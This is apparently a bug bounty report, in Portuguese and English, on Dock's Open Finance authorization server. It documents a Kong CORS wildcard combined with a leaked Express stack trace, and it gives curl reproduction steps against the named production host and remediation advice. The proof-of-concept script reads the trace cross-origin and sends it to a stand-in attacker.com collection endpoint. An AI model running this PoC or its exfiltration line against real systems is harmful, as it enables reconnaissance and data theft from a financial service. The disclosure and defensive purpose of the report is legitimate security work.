# Finding D4 — OpenBanking FAPI: CORS Wildcard + Stack Trace Disclosure

**Título:** Kong API Gateway Overwrites App-Level CORS Policy → Permissive Cross-Origin + Server Stack Trace Readable from Any Origin  
**Severidade:** MEDIUM (CVSS 6.1 — AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)  
**CWE:** CWE-942 (Permissive Cross-Origin Resource Sharing Policy) + CWE-209 (Generation of Error Message Containing Sensitive Information)  
**Status:** Confirmado — dois bugs encadeados, ambos reproduzíveis  
**Escopo originário:** `*.dock.tech` → alvo: `auth.openbanking.dock.tech` (plataforma Caradhras Open Finance Brasil)  
**Programa:** Bugpay (Dock) — produção apenas

---

## Discovery Chain

```
Passive recon: subfinder → auth.openbanking.dock.tech
  → /.well-known/openid-configuration → 200 (OIDC discovery)
    → introspection_endpoint: /auth/token/introspection
      → POST token=test → HTTP 500 + via: kong/3.10.0.7-enterprise-edition
        → Inspect headers: access-control-allow-origin: * (no response body)
          → OPTIONS preflight Origin: evil.com → 200 + access-control-allow-origin: *
            → POST Origin: evil.com → 500 + access-control-allow-origin: * + FULL STACK TRACE
              → Root cause: Kong CORS plugin (global *) overrides Express corsOptions.js (which throws instead of rejecting)
```

---

## Sumário Técnico

Dois bugs distintos encadeados em uma arquitetura de dois níveis (Kong API Gateway + Express.js backend):

**Bug 1 — CWE-942: CORS Wildcard via Kong (camada de gateway)**  
O plugin CORS do Kong está configurado globalmente para responder `access-control-allow-origin: *` a **toda requisição**, incluindo rotas da API FAPI financeira. Isso permite que qualquer página web faça requisições cross-origin ao endpoint de introspeção de tokens e leia as respostas.

**Bug 2 — CWE-209: Stack Trace Disclosure (camada de aplicação)**  
A aplicação Express.js possui sua própria lógica CORS em `/app/helpers/corsOptions.js` que tenta restringir origens. Porém, ao receber uma origem não permitida, a função **lança uma exceção (throw)** em vez de retornar um erro adequado. Isso faz o `cors` npm package propagar a exceção como HTTP 500, retornando um HTML com o stack trace completo da aplicação.

O efeito combinado: Kong adiciona `access-control-allow-origin: *` ao 500, e o browser **permite ao JavaScript do atacante ler o stack trace cross-origin**.

---

## Evidências

### Bug 1 — OPTIONS Preflight: Kong responde ACAO: * incondicionalmente

```bash
$ curl -sk -X OPTIONS "https://auth.openbanking.dock.tech/auth/token/introspection" \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: content-type" \
  -D -

HTTP/2 200
access-control-allow-origin: *
access-control-allow-headers: content-type
access-control-allow-methods: GET,POST,PUT,DELETE,PATCH
x-v: 1.0.0
x-kong-response-latency: 0
x-kong-request-id: da05c03f6aa2a53f5080d012844a7d6f
strict-transport-security: max-age=15724800; includeSubDomains
```

> **Observação crítica**: O preflight retorna `200 OK` com `ACAO: *`. O browser interpreta isso como aprovação para a requisição cross-origin real.

### Bug 2 — POST com origem externa: ACAO: * na resposta 500 + Stack Trace

```bash
$ curl -sk -X POST "https://auth.openbanking.dock.tech/auth/token/introspection" \
  -H "Origin: https://evil.com" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "token=test" \
  -D -

HTTP/2 500
content-type: text/html; charset=utf-8
content-length: 1012
x-fapi-interaction-id: 477ccb7d-7232-4087-9b41-45b2e6e5238e
x-correlation-id: 477ccb7d-7232-4087-9b41-45b2e6e5238e
x-powered-by: Express
access-control-allow-origin: *                    ← Kong adiciona mesmo no 500
via: 1.1 kong/3.10.0.7-enterprise-edition
x-kong-upstream-latency: 3
x-kong-proxy-latency: 2
x-kong-request-id: 68becf4eed484b527cd09b6a4c0a9b3b

<!DOCTYPE html>
<html lang="en"><head><title>Error</title></head><body>
<pre>Error: Not allowed by CORS
    at origin (file:///app/helpers/corsOptions.js:30:22)
    at /app/node_modules/cors/lib/index.js:219:13
    at optionsCallback (/app/node_modules/cors/lib/index.js:199:9)
    at corsMiddleware (/app/node_modules/cors/lib/index.js:204:7)
    at patched (/app/node_modules/@opentelemetry/instrumentation-express/build/src/instrumentation.js:140:37)
    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
    at next (/app/node_modules/express/lib/router/index.js:280:10)
    ...
</pre>
</body></html>
```

### Origem legítima Dock também gera 500

```bash
$ curl -sk -X POST "https://auth.openbanking.dock.tech/auth/token/introspection" \
  -H "Origin: https://shared-consent.openbanking.dock.tech" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "token=test" \
  -w "\nHTTP: %{http_code}"

Error: Not allowed by CORS [stack trace omitido]
HTTP: 500
```

> O corsOptions.js rejeita **todas** as origens, incluindo as da própria Dock. O middleware Express CORS está completamente quebrado, lançando exceção para qualquer Origin.

### Comportamento com autenticação correta (baseline)

```bash
# Sem token (autenticação ausente): 400 correto do Kong
$ curl -sk -X POST ".../introspection" -d "token=" -w "%{http_code}"
400  # {"error":"no client authentication mechanism provided"}

# Com auth via Basic header: 401 correto (Kong valida)
$ curl -sk -X POST ".../introspection" \
  -H "Authorization: Basic Y2xpZW50OnNlY3JldA==" \
  -d "token=test" -w "%{http_code}"
401  # {"error":"invalid_client"}
```

> O Kong valida autenticação OAuth client corretamente — o 500 só ocorre quando a requisição chega ao Express backend.

---

## Root Cause Analysis

### Arquitetura de dois níveis com conflito de CORS

```
Browser (evil.com)
    │
    │ CORS Preflight + Actual Request
    ▼
Kong API Gateway (3.10.0.7-enterprise)
    │ → Plugin CORS global: adiciona ACAO:* em TODA resposta
    │ → Encaminha para upstream (quando autenticação passa)
    ▼
Express.js + Node.js (/app)
    │ → corsOptions.js:30 tenta verificar Origin
    │ → throw "Not allowed by CORS" ← BUG: throw em vez de callback(new Error(...))
    │ → cors npm package (index.js:219) não trata exceção
    │ → Express default error handler: HTML 500 com stack trace
    ▼
Kong adiciona ACAO:* ao 500 antes de devolver ao browser

Resultado: browser vê ACAO:* no preflight + ACAO:* no 500
           → JavaScript do atacante pode chamar .text() e ler o stack trace
```

### Código defeituoso (inferido do stack trace)

```javascript
// /app/helpers/corsOptions.js — linha 30 aproximadamente
const corsOptions = {
  origin: function(origin, callback) {
    if (allowedOrigins.includes(origin)) {
      callback(null, true)
    } else {
      throw new Error('Not allowed by CORS')  // BUG: throw ao invés de callback(err)
      // Correto seria: callback(new Error('Not allowed by CORS'))
    }
  }
}
```

A documentação do npm `cors` especifica que o callback deve ser chamado no estilo Node.js `callback(error, value)`. Usar `throw` propaga uma exceção síncrona não capturada que derruba o middleware stack.

---

## PoC — JavaScript Executável em Qualquer Origem

```html
<!-- evil.com/attack.html -->
<script>
fetch('https://auth.openbanking.dock.tech/auth/token/introspection', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'token=test',
  mode: 'cors',
  credentials: 'omit'
})
.then(response => response.text())
.then(stackTrace => {
  // Browser permite leitura porque ACAO:* está em ambas as respostas
  // stackTrace contém: file:///app/helpers/corsOptions.js:30:22
  // + caminhos de node_modules, versões, estrutura interna
  console.log('Stack trace lido cross-origin:', stackTrace.substring(0, 500))
  // Exfiltrar para C2:
  navigator.sendBeacon('https://attacker.com/collect', stackTrace)
})
.catch(e => console.log('Erro:', e))  // Não deve ocorrer se ACAO:* presente
</script>
```

**Pré-condição**: Nenhuma. Qualquer website pode executar este PoC contra qualquer visitante.  
**Impacto direto**: Leitura cross-origin de stack trace + structure interna da aplicação.

---

## Informações Sensíveis Reveladas

| Item | Valor | Impacto |
|------|-------|---------|
| Caminho da aplicação | `file:///app/helpers/corsOptions.js` | Estrutura de diretórios do container |
| Framework | `Express.js` (via `x-powered-by: Express`) | Narrows attack surface |
| Middleware CORS | `cors` npm package v? (index.js:219) | Identifica versão pelo line number |
| APM/Tracing | `@opentelemetry/instrumentation-express` | Stack de observabilidade exposto |
| Padrão de rotas | `express/lib/router/layer.js:95`, `router/index.js:280` | Arquitetura Express roteamento |
| Versão Kong | `3.10.0.7-enterprise-edition` | API Gateway fingerprinting |

---

## Análise de Impacto

### Cenário 1 — Disclosure de Arquitetura (impacto atual, sem pré-condição)
Qualquer atacante pode mapear a estrutura interna do servidor de autorização OpenBanking da Dock de qualquer origem, sem autenticação, via CORS bypass.

### Cenário 2 — FAPI Compliance Violation
O perfil FAPI 1.0 Advanced (adotado pelo Open Finance Brasil) exige que servidores de autorização não exponham `access-control-allow-origin: *`. A presença de CORS wildcard em endpoints OAuth financeiros é uma violação do perfil FAPI e pode ser reportada ao Banco Central do Brasil como não-conformidade.

### Cenário 3 — Futuro encadeamento (se auth bypass encontrado)
Se um atacante encontrar um bypass de `client_credentials` (ex: via parâmetros alternativos), o CORS wildcard existente permitiria ler resultados de introspeção de tokens de usuários reais a partir de sites maliciosos.

---

## Matriz de Evidência

| Claim | Evidência | Reproduzível |
|-------|-----------|-------------|
| OPTIONS retorna ACAO: * | `access-control-allow-origin: *` no preflight | ✅ 3/3 |
| POST retorna ACAO: * | Header presente na resposta 500 | ✅ 3/3 |
| Stack trace legível cross-origin | Resposta 1012 bytes com file:/// paths | ✅ 3/3 |
| Bug em corsOptions.js | `throw` no stack trace em vez de `callback(err)` | ✅ Inferido diretamente |
| Origem legítima Dock também gera 500 | shared-consent.openbanking.dock.tech → 500 | ✅ 1/1 |
| Kong adiciona ACAO global | `x-kong-response-latency: 0` no preflight (Kong serviu, não upstream) | ✅ Confirmado |

---

## Remediação

### Prioridade 1 — Corrigir corsOptions.js (fix imediato)

```javascript
// INCORRETO (atual):
throw new Error('Not allowed by CORS')

// CORRETO:
callback(new Error('Not allowed by CORS'))
// OU retornar false para rejeitar silenciosamente:
callback(null, false)
```

### Prioridade 2 — Restringir plugin CORS do Kong

Substituir o plugin CORS global com `allow_origins: *` por uma configuração de rota específica com lista de origens permitidas:

```yaml
# Kong plugin config (por rota)
plugins:
  - name: cors
    config:
      origins:
        - https://shared-consent.openbanking.dock.tech
        - https://app.openbanking.dock.tech
      methods: [GET, POST]
      headers: [Authorization, Content-Type]
      credentials: false
      max_age: 3600
```

### Prioridade 3 — Remover x-powered-by

```javascript
app.disable('x-powered-by')  // Remove "Express" header
```

### Prioridade 4 — Handler de erro personalizado (não expor stack em produção)

```javascript
app.use((err, req, res, next) => {
  // Log interno — nunca expor stack ao cliente
  logger.error({ err, requestId: req.headers['x-fapi-interaction-id'] })
  res.status(500).json({ error: 'server_error', error_description: 'Internal error' })
})
```
